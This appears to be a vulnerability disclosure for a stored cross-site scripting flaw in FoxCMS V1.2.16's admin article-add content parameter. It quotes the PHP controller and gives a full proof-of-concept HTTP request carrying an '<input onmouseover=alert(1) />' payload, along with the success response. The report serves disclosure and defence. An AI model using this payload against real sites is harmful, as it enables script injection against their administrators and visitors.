FoxCMS - Cross Site Scripting on (app/admin/controller/Article.php content parameter) 

Vendor Homepage:
```
https://gitee.com/qianfox/foxcms
```

Version: 

```
V1.2.16
```

Tested on: 

```
PHP, Nignx, MySQL
```

Affected Page:

```
app/admin/view/article/add.html
```

On this page, content parameter is vulnerable to Cross Site Scripting

```
public function add()
    {
        $param = $this->request->param();

        $bcid = $param['bcid'];
        View::assign('bcid', $bcid);
        $ids = explode('_', $bcid);
        $columnId = $ids[sizeof($ids) - 1]; //栏目id
        $column = Column::find($columnId);
        if (!empty($column->tier)) {
            $bcidStr = '4_' . str_replace(",", "_", $column->tier);
        } else {
            $bcidStr = '4';
        }
        $breadcrumb = Column::getBreadcrumb($bcidStr);
        array_push($breadcrumb, ['id' => '', 'title' => '添加文章', 'name' => DIRECTORY_SEPARATOR . config('adminconfig.admin_path') . '/Article/add', 'url' => 'javascript:void(0)']);
        View::assign("breadcrumb", $breadcrumb);
        if ($this->request->isAjax()) {
            if (array_key_exists("content", $param)) {
                $rdata = $this->replaceContent($param, 'content'); //替换内容
                if ($rdata["code"] == 0) {
                    $this->error($rdata['msg']);
                }
                $param['content'] = $rdata['content']; //替换内容
            }
            if (empty($param["release_time"])) {
                $param["release_time"] = date("Y-m-d H:i:s");
            }
            if (empty($param["click"])) {
                $param["click"] = rand(1, 100);
            }
            $tags = $param["tags"];
            if (!empty($tags)) { //文档标签
                $this->addTags($tags);
            }
            $param['lang'] = $this->getMyLang();
            $article = \app\common\model\Article::create($param);
            xn_add_admin_log("文章添加", "article", $param['title']); //添加日志
            $seo = xn_cfg("seo");
            if ($seo["url_model"] == 3) {
                $rparam =  ["columnId" => $param["column_id"], "oneId" => "key3", "first" => 1, "column_model" => "article", "id" => $article->id];
                $rparam = array_merge($rparam, $seo);
                $this->success('操作成功', "", $rparam);
            } else {
                $this->success('操作成功');
            }
        }
        View::assign('column', $column);
        return view();
    }
```

Function point location：

<img width="2878" height="1488" alt="image" src="https://github.com/user-attachments/assets/cafea264-787a-4828-aafb-9ac9f2070512" />




Request:

```
POST /index.php/admin4435/Article/add.html HTTP/1.1
Host: www.foxcms.cms
Content-Length: 246
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 Edg/140.0.0.0
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://www.foxcms.cms
Referer: http://www.foxcms.cms/index.php/admin4435/Article/add.html?type=1&bcid=2_11
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: PHPSESSID=7c8341b30311677309e6835915d1b2c9; access_127_0_0_1=1761037029
Connection: close

title=test-xss1&brief_title=&article_field=&column_id=11&column=%E4%BC%81%E4%B8%9A%E5%8A%A8%E6%80%81&breviary_pic_id=&keywords=&description=&article_source=&author=&team_status=%2C&content=<input+onmouseover=alert(1)+/>&release_time=&click=&tags=
```

Response:

```
HTTP/1.1 200 OK
Server: nginx/1.15.11
Date: Tue, 21 Oct 2025 10:05:15 GMT
Content-Type: application/json; charset=utf-8
Connection: close
X-Powered-By: PHP/7.3.4
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 1800
Access-Control-Allow-Methods: GET, POST, PATCH, PUT, DELETE, OPTIONS
Access-Control-Allow-Headers: Authorization, Content-Type, If-Match, If-Modified-Since, If-None-Match, If-Unmodified-Since, X-CSRF-TOKEN, X-Requested-With
Access-Control-Allow-Origin: http://www.foxcms.cms
Set-Cookie: PHPSESSID=7c8341b30311677309e6835915d1b2c9; expires=Wed, 22-Oct-2025 10:05:15 GMT; Max-Age=86400; path=/
Content-Length: 59

{"code":1,"msg":"操作成功","data":"","url":"","wait":1}
```
<img width="2878" height="1614" alt="image" src="https://github.com/user-attachments/assets/d767094c-0986-4303-b930-90ddd775ccb3" />
